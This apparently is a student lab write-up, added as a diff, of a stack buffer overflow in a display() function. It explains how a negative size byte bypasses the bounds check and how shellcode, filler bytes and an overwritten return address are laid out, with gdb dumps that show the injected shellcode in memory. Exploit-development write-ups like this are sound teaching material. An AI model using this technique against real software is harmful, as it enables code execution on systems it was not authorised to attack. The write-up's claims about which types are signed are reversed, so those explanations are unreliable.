@@ -1,0 +1,36 @@
+The vulnerability in this question is a stack buffer overflow in the function display(). The function does a signed integer to unsigned integer conversion. This allows us to bypass a bounds check using a negative signed integer that is supposed to limit the amount of bytes that we can write to the buffer to 128. The negative signed integer then becomes a singned integer greater than 128, allowing us to write past the end of the buffer. An attacker could use this to write malicious shellcode to the system and alter the eip to point to it.
+
+I started this question by looking at the code. I didn’t know what the functions fopen() and fread() were so I searched them on Google. I found that fread() has parameters void *ptr, size_t size, size_t nmenb, and FILE *stream. The parameter size_t size is a signed integer and the variable int8_t size in display() is an unsigned integer. In the bounds check statement in display(), there is only an upper bound check for less than 128 bytes. There is no lower bound check. My thought now was to bypass this check using a negative integer that is read as a large unsigned integer to write past the end of the buffer msg[128].
+
+The egg starts with the number of bytes to read as the first hex entry. I chose to use \xff which is -1 as a signed integer and 255 as an unsigned integer. This writes -1 to size and bypasses the size > 128 bounds check. When size is passed to fread(), it gets converted to its unsigned integer 255 and allows us to write past the end of msg[128].
+
+(gdb) info frame
+ ………
+ Saved registers:
+  ebp at 0xbffff748, eip at 0xbffff74c
+
+Using gdb, I found that the buffer started at 0xbffff6b8 and that the eip was stored at 0xbfff74c. I decided to put the shellcode at the beginning of the buffer and to overflow the buffer with no-ops to get to the eip. This meant that the beginning of the shellcode was at 0xbffff6b8 and that I needed 103 no-ops after the shellcode to get to the eip. I used \x11 as my no-op. I overwrote the eip with 0xbffff6b8 so that the next instruction pointed to the beginning of the shellcode to get the shellcode to run.
+
+In the end, I wrote to the buffer the shellcode, followed by 103 no-ops, followed by the address of the beginning of the shellcode in that order.
+
+before exploit
+(gdb) x/20x $esp
+0xbffff6a0:	0xbffff6b8	0x00000000	0x00000080	0xb7fdcb48
+0xbffff6b0:	0x00000001	0x00000000	0x00000000	0x00000000
+0xbffff6c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff6d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff6e0:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) x/8x 0xbffff730
+0xbffff730:	0x00000000	0x00000000	0x0804a000	0x080485e2
+0xbffff740:	0x00000002	0xbffff804	0xbffff768	0x0804857b
+
+after exploit
+(gdb) x/20x $esp
+0xbffff6a0:	0xbffff6b8	0x00000001	0xffffffff	0x0804b008
+0xbffff6b0:	0x00000001	0xff000000	0x895e1feb	0xc0310876
+0xbffff6c0:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
+0xbffff6d0:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
+0xbffff6e0:	0x732f6e69	0x11111168	0x11111111	0x11111111
+(gdb) x/8x 0xbffff730
+0xbffff730:	0x11111111	0x11111111	0x11111111	0x11111111
+0xbffff740:	0x11111111	0x11111111	0x11111111	0xbffff6b8
